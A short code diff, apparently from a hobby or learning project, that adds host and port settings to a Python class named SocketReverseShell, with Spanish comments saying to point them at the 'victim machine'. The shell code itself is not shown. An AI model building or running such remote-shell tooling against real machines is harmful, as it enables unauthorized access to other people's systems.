@@ -23,5 +23,8 @@ class SocketReverseShell:
         print(message_decoder)
 
 if __name__ == '__main__':
+    HOST = "127.0.0.1" # Cambia esta IP por la máquina víctima.
+    PORT = 5000 # Cambia este puerto por el puerto que está escuchando la máquina víctima.
+    
     socket_object = SocketReverseShell()
     socket_object.create_socket()
